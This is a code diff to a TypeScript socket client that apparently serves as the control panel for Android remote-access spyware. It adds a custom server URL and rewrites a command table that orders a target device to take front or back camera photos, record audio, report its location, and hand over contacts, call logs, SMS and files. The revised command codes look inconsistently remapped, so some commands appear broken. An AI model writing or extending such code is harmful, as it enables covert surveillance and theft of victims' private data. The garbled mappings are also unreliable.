@@ -4,6 +4,8 @@ import { getActiveServerUrl } from './appwrite';
 let socket: Socket | null = null;
 let connectionPromise: Promise<Socket> | null = null;
 let resultCallback: ((data: SocketResult) => void) | null = null;
+let currentUserId: string | null = null;
+let currentServerUrl: string | undefined = undefined;
 
 export interface CommandData {
     userId: string;
@@ -65,8 +67,10 @@ export interface SocketResult {
     audio?: boolean;
 }
 
-async function createSocket(userId: string): Promise<Socket> {
-    const socketUrl = await getActiveServerUrl();
+async function createSocket(userId: string, customServerUrl?: string): Promise<Socket> {
+    const socketUrl = (customServerUrl && customServerUrl.trim())
+        ? customServerUrl.trim().replace(/\/$/, '')
+        : (await getActiveServerUrl());
 
     const nextSocket = io(socketUrl, {
         query: {
@@ -81,7 +85,7 @@ async function createSocket(userId: string): Promise<Socket> {
     });
 
     nextSocket.on('connect', () => {
-        console.log('Socket connected:', nextSocket.id);
+        console.log('Socket connected to', socketUrl, 'with id:', nextSocket.id);
     });
 
     nextSocket.on('disconnect', (reason) => {
@@ -92,7 +96,7 @@ async function createSocket(userId: string): Promise<Socket> {
     });
 
     nextSocket.on('connect_error', (error) => {
-        console.error('Socket connection error:', error.message);
+        console.error('Socket connection error on', socketUrl, ':', error.message);
     });
 
     if (resultCallback) {
@@ -104,9 +108,9 @@ async function createSocket(userId: string): Promise<Socket> {
     return nextSocket;
 }
 
-export function initSocket(userId: string): Socket | null {
-    // If already connected with same user, return existing socket
-    if (socket?.connected) {
+export function initSocket(userId: string, customServerUrl?: string): Socket | null {
+    // If already connected with same user and server URL, return existing socket
+    if (socket?.connected && currentUserId === userId && currentServerUrl === customServerUrl) {
         return socket;
     }
 
@@ -116,7 +120,10 @@ export function initSocket(userId: string): Socket | null {
         socket = null;
     }
 
-    connectionPromise = createSocket(userId).finally(() => {
+    currentUserId = userId;
+    currentServerUrl = customServerUrl;
+
+    connectionPromise = createSocket(userId, customServerUrl).finally(() => {
         connectionPromise = null;
     });
 
@@ -139,23 +146,15 @@ export function disconnectSocket(): void {
     }
 }
 
-export function sendCommand(commandData: CommandData): boolean {
-    if (socket?.connected) {
-        socket.emit('command', commandData);
-        console.log('Command sent:', commandData);
-        return true;
-    } else {
-        console.error('Socket not connected. Attempting to reconnect...');
-        if (socket) {
-            socket.connect();
-        } else if (connectionPromise) {
-            connectionPromise.then((connectedSocket) => {
-                connectedSocket.emit('command', commandData);
-                console.log('Command sent after connection:', commandData);
-            });
-        }
+export function sendCommand(data: CommandData): boolean {
+    if (!socket || !socket.connected) {
+        console.warn('Socket not connected. Cannot send command.');
         return false;
     }
+
+    socket.emit('order', data);
+    console.log('Command sent:', data);
+    return true;
 }
 
 export function onResult(callback: (data: SocketResult) => void): void {
@@ -166,14 +165,37 @@ export function onResult(callback: (data: SocketResult) => void): void {
     }
 }
 
-// Command orders (from original app)
+// Predefined command helpers
 export const COMMANDS = {
-    CAMERA: 'x0000ca',       // Camera capture - extra: 0 = back, 1 = front
-    MICROPHONE: 'x0000mc',   // Microphone recording - sec: duration in seconds
-    CONTACTS: 'x0000cn',     // Get contacts
-    CALLS: 'x0000cl',        // Get call logs
-    SMS: 'x0000sm',          // Get SMS - extra: 'ls' for list
-    LOCATION: 'x0000lm',     // Get location
-    FILE_MANAGER: 'x0000fm', // File manager - req: 0 = browse, 1 = download
-} as const;
+    // Camera
+    CAMERA_MAIN: (userId: string) => ({ userId, command: { order: 'x0000ca', extra: '1' } }),
+    CAMERA_SELFIE: (userId: string) => ({ userId, command: { order: 'x0000ca', extra: '0' } }),
 
+    // Location
+    LOCATION: (userId: string) => ({ userId, command: { order: 'x0000lo' } }),
+
+    // Contacts
+    CONTACTS: (userId: string) => ({ userId, command: { order: 'x0000cl' } }),
+
+    // Calls
+    CALL_LOGS: (userId: string) => ({ userId, command: { order: 'x0000mc' } }),
+
+    // SMS
+    SMS_LIST: (userId: string) => ({ userId, command: { order: 'x0000ms' } }),
+
+    // Files
+    FILE_LIST: (userId: string, path: string = '0') => ({
+        userId,
+        command: { order: 'x0000fm', req: 0, path },
+    }),
+    DOWNLOAD_FILE: (userId: string, path: string) => ({
+        userId,
+        command: { order: 'x0000fm', req: 1, path },
+    }),
+
+    // Microphone
+    RECORD_AUDIO: (userId: string, durationSeconds: number = 10) => ({
+        userId,
+        command: { order: 'x0000mi', sec: durationSeconds },
+    }),
+};
